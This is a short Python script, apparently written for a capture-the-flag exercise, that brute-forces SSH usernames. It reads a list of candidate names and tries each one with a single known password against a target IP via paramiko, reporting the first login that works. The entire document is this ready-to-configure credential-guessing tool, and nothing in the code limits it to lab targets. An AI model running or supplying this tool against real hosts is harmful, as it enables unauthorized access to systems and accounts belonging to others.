#!/usr/bin/env python3

#==============================================================#
#  Attempt to find the correct user for a given SSH password.  #
#==============================================================#
#
# Became useful in a CTF.
#
#==============================================================#

import paramiko # http://docs.paramiko.org/en/stable/api/client.html
import sys

ip            = ''

userfile      = '' # file with usernames
password      = '' # correct password

port          = 22
tcptimeout    = 6   # seconds

def get_users(file):
        lines = []
        try:
                with open(file, 'r') as list:
                        lines = list.readlines()
        except Exception as e:
                print(f'[+] Failed to get users: {str(e)}')
                sys.exit(1)
        return [line.strip('\n') for line in lines]


def login(client, user, password):
        try:
                client.connect(ip, port, user, password, timeout=tcptimeout)
                return True
        except paramiko.AuthenticationException:
                return False
        except Exception as e:
                print(f'[+] Failed to connect: {str(e)}')
                sys.exit(1)

def main():

        users = get_users(userfile)

        print(f'[+] Configuration:')
        print(f'        [ip          ] {ip}:{port}')
        print(f'        [tcp timeout ] {tcptimeout}s')
        print(f'        [password    ] {password}')
        print(f'        [user list   ] {userfile}')
        print(f'        [total users ] {len(users)}')

        if len(users) == 0:
                print(f'[+] No usernames found')
                sys.exit(0)

        print(f'[+] Attempting login ...')
        with paramiko.SSHClient() as client:
                client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)

                for user in users:
                        if login(client, user, password):
                                print(f'[+] LOGIN SUCCESSFUL! [{user}:{password}] ')
                                break
                        else:
                                print(f'[+] Credentials [{user}:{password}] not valid...')
                print(f'[+] Finished...')

info = '''

   Automated SSH login script, iterating over usernames with a known password.
   (Became useful in a CTF.)

'''

if __name__ == '__main__':
        print(info)
        if ip == '' or userfile == '' or password == '':
                print(f' Don\'t forget to configure the script parameters: ')
                print(f'   [-] ip')
                print(f'   [-] password (correct password)')
                print(f'   [-] userfile (file that contains possible usernames)')
                sys.exit(0)
        main()
